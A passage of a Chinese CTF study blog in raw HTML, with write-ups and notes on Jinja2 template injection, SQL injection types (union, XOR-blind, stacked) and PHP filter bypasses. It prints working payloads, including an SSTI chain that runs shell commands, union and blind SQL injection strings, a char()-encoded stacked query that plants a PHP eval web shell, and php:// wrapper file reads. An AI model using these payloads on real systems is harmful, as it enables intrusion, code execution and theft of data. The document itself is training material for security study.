class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微优化了一下下呀。</p><p><img src="/2021/05/28/CTF/image-20210602232640054.png" alt="炫酷的界面"></p><h3 id="SSTI、Jinja2-Templated"><a href="#SSTI、Jinja2-Templated" class="headerlink" title="SSTI、Jinja2-Templated"></a>SSTI、Jinja2-Templated</h3><pre class="line-numbers language-none"><code class="language-none">Site still under constructionProudly powered by Flask&#x2F;Jinja2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开局给的提示，用的python的flask写的，这很明显的ssti漏洞，而且还是Jinja2的。</p><p>ssti但是没有给注入点提示啊，给个<code>id=1</code>也好啊，这种情况我也么啥好用的工具，只好看看wp，原来直接<code>/&#123;&#123;7+7&#125;&#125;</code>就行了，然后就是Jinja2的专用payload了，一般这些ssti的payload都是相似的，所以总结一下。</p><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文</a></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>class是本类、mro是父类、subclasses是子类集合，这里的子类是<code>186</code>里面有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>似乎是。</p><p><img src="/2021/05/28/CTF/image-20210602234813169.png" alt="image-20210602234813169"></p><pre class="line-numbers language-none"><code class="language-none">HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入常用函数与知识点"><a href="#SQL注入常用函数与知识点" class="headerlink" title="SQL注入常用函数与知识点"></a>SQL注入常用函数与知识点</h3><h4 id="字符串提取-substr、mid"><a href="#字符串提取-substr、mid" class="headerlink" title="字符串提取(substr、mid)"></a>字符串提取(substr、mid)</h4><div class="table-container"><table><thead><tr><th>函数名称</th><th>函数使用</th><th>函数功能</th><th>详细链接</th></tr></thead><tbody><tr><td>substr</td><td>substr()</td><td></td><td></td></tr><tr><td>mid</td><td>mid(“text”,1,1)</td><td>返回t，第一个1表示起始位置，第二个1表示截取长度</td><td><a href="https://www.w3school.com.cn/sql/sql_func_mid.asp">MID使用</a></td></tr></tbody></table></div><p><img src="/2021/05/28/CTF/image-20210601161051184.png" alt="mid方法"></p><h3 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入就是在一个地方进行数据库插入，另一个地方进行数据库数据的取出，插入时可能对注入进行了过滤啥的，但是取出的时候没进行过滤，就能执行我们想要插入的恶意代码了。</p><p>但是这个注入的断定是比较难的，因为要对两个不同的位置进行联合测试，应该是所有注入类型中最难找到的了，实战中我们往往会错过这类注入点。</p><p>这类注入点没有特定的payload，往往与下面的各种注入类型交叉使用。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>一般分为<code>单引号</code>、<code>双引号</code>的字符型联合注入，和数字型联合注入。</p><p>联合查询注入现在实战应用中已经很少了，这种是没有什么难度的。</p><h4 id="盲注-时间盲注、布尔盲注"><a href="#盲注-时间盲注、布尔盲注" class="headerlink" title="盲注(时间盲注、布尔盲注)"></a>盲注(时间盲注、布尔盲注)</h4><h4 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a>异或盲注</h4><h4 id="形成原理与payload"><a href="#形成原理与payload" class="headerlink" title="形成原理与payload"></a>形成原理与payload</h4><p><strong>盲注的形成原理都是相同的，不存在返回值，或者只存在对于错的返回值这种，但是我们插入进去的SQL语句又实实在在是起到了作用了的就能使用盲注来进行获取数据信息。</strong></p><p>这里主要再说一下异或盲注的形成原理与payload，异或注入的表现为<code>?id=1^1^1</code>返回的是<code>?id=1</code>的内容、<code>?id=1^0^1</code>返回的是<code>?id=0</code>的内容。这样就能借助SQL里面的一些方法来获取数据库里面的数据信息啦。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不断变换<code>database()</code>处为我们想注入的SQL语句、后面第一个1是第几个字母、后面的32为字母的值。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="简单介绍与一般payload"><a href="#简单介绍与一般payload" class="headerlink" title="简单介绍与一般payload"></a>简单介绍与一般payload</h5><p>堆叠注入是利用<code>;</code>隔开几个查询语句，使得几个查询语句都可以进行，从而进行SQL注入。危险的SQL语句一般为<code>mysql_multi_query()</code>，因为<code>mysql_multi_query()</code> 支持多条sql语句同时执行，每个SQL语句使用<code>;</code>分隔即可分别执行。</p><p>没有固定的payload一般payload如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是实战时只是用上面的语句的可能性几乎为零，而且这个似乎只是php的这个<code>mysql_multi_query()</code>语句的特性，而实战时几乎好多都是jsp、asp等老网页，也是比较安全的(一定是我现在太菜了，还没开始学jsp、asp的原因才会觉得这两种语言写的网页安全)。</p><h4 id="绕过限制Bypass"><a href="#绕过限制Bypass" class="headerlink" title="绕过限制Bypass"></a>绕过限制Bypass</h4><p>基于上面的几种注入又各自有不同的绕过限制的方法，上面的几种注入只是我们使用SQL注入的大纲，但是更重要的是各种限制的绕过，比如说禁用了单双引号，也许可以想想使用<code>\</code>来转义单双引号来绕过限制等等。</p><hr><h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h4><p><strong>TAG:二次注入、联合查询注入</strong></p><p>给出的有两个功能，一个注册登录、一个修改密码的功能(查询的是用户名)</p><p>先使用下面的payload进行测试</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D; 1&#39; union select database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>password可以自己随便设置，直接登录即可发现数据已经注出来了。</p><p><img src="/2021/05/28/CTF/image-20210604235055344.png" alt="image-20210604235055344"></p><p>这题不是盲注就不用使用脚本了，直接贴出所有的payload，直接注册登录就能查询到信息了。</p><p><strong>爆数据表</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235538363.png" alt="image-20210604235538363"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235738874.png" alt="image-20210604235738874"></p><p><strong>获取数据</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select * from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235837283.png" alt="image-20210604235837283"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;fd2e5523-e1d1-4f17-aa7a-a85142ff023f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="sql注入getshell、-SUCTF-2018-MultiSQL"><a href="#sql注入getshell、-SUCTF-2018-MultiSQL" class="headerlink" title="sql注入getshell、[SUCTF 2018]MultiSQL"></a>sql注入getshell、[SUCTF 2018]MultiSQL</h4><p>这个给出的是一个小网站，有登录、注册、查看个人信息、上传个人头像等功能。</p><p><img src="/2021/05/28/CTF/image-20210601150932381.png" alt="image-20210601150932381"></p><p>根据上面的这个payload确认这里是存在SQL注入漏洞的，而且还是异或注入。可以用下面的payload自行进行测试</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^0^1http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^1^1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后接下去继续测试注入，但是substr似乎是被过滤掉了，这里考虑使用mid来替代substr</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里不仅仅有异或注入，还有堆叠注入，直使用下面的payload也是没有报错的</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就是堆叠注入用<code>select into outfile</code>写入shell，这是一个php做的网站，所以可以用下面的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[4]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>res <span class="token operator">=</span> <span class="token string">"char("</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token comment"># char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,52,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用sql的预处理来写shell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> shell <span class="token keyword">from</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">execute</span> shell<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预处理的实验</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> i <span class="token keyword">FROM</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只是不知道为什么执行成功了，但是没有返回数据库的信息，只显示了查询出了多少行。</p><p>执行上面的payload之后在这里找shell<code>/favicon/shell.php</code>，蚁剑连接shell即可。</p><p><img src="/2021/05/28/CTF/image-20210601175949497.png" alt="image-20210601175949497"></p><p><img src="/2021/05/28/CTF/image-20210601180101679.png" alt="找到flag即可"></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SSTI全名为服务端模板注入。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文CSDN</a></p><ol><li>第一个Jinja2，较为常见的。</li></ol><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>php可以说现在是一般的中等比赛上面都会出的一种简单的题目了，因为php相关的知识点繁多复杂，所以这里列出了php的知识点与题目两个分类，将知识点列为一个单独分类的目的就是未来比赛的时候找知识点的时候方便查找，而不是随即再去百度，减少一些不必要的麻烦。</p></blockquote><h3 id="PHP知识点"><a href="#PHP知识点" class="headerlink" title="PHP知识点"></a>PHP知识点</h3><h4 id="php短标签绕过"><a href="#php短标签绕过" class="headerlink" title="php短标签绕过"></a>php短标签绕过</h4><p>这个绕过的是对<code>php</code>这个关键字或者<code>&lt;?php</code>这个关键字有限制的情况，<code>&lt;?php ?&gt;</code>这个叫做长标签，而<code>&lt;? ?&gt;</code>叫做短标签。</p><h4 id="php空格绕过"><a href="#php空格绕过" class="headerlink" title="php空格绕过"></a>php空格绕过</h4><ol><li>限制了空格的使用的情况下可以使用php的<code>%09</code>来代替。因为在ASCII码制中<code>0x09</code>代表的是水平制表符，也就是转义的<code>\t</code>，当然直接用<code>\t</code>可能也是可以的，分情况而论都试一下就好了。</li></ol><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ol><li>反引号在php中可以命令执行，但是在双引号内反引号引住的内容好像不能被执行，其余情况下反引号的作用相当于<code>shell_exec()</code>，当关闭<code>shell_exec()</code>这个函数的时候，反引号也将不再起作用。</li></ol><h4 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h4><pre class="line-numbers language-none"><code class="language-none">1.?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;                          #GET数据2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;            #后面的base64字符是需要传入的字符串的base64编码3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:]&lt;?php phpinfo();?&gt;                  #POST数据4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  #get读源码5.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;flag.php   #其他编码读源码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php中array赋值失败绕过"><a href="#php中array赋值失败绕过" class="headerlink" title="php中array赋值失败绕过"></a>php中array赋值失败绕过</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">9223372036854775807</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 返回值为1 NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可见第二次给数组赋值失败，因为默认似乎是给这个数值<code>9223372036854775807</code>加一进行赋值的，但是又超过最大值了，所以会赋值失败。可用于以下的情况的绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 此种情况下只需要将$a的值赋为9223372036854775807即可。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"绕过失败！&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"绕过成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php死亡退出"><a href="#php死亡退出" class="headerlink" title="php死亡退出"></a>php死亡退出</h4><p>例子如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|utf|zlib|data|input|iconv|base64|htaccess|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonononono!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$g</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'xxx'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"&lt;?php exit();"</span><span class="token punctuation">.</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的filename可以设置为php伪协议，用write的方式写入文件。然后使用string.rot13编码或者base64decode都行，应该都是可以绕过这个死亡退出的。但是如果前面的filename使用的是rot13进行编码的话，必须要把php的短标签给禁用掉，因为rot13编码里面，符号并不会进行编码，那这个里面的内容还会解析，就会报错应该是。</p><h4 id="md5のtrick"><a href="#md5のtrick" class="headerlink" title="md5のtrick"></a>md5のtrick</h4><p><a href="https://jaimelightfoot.com/blog/b00t2root-ctf-easyphp/">b00t2root CTF: EasyPhp</a></p><p>遇到再总结。</p><h3 id="PHP题目"><a href="#PHP题目" class="headerlink" title="PHP题目"></a>PHP题目</h3><h4 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"action"</span><span 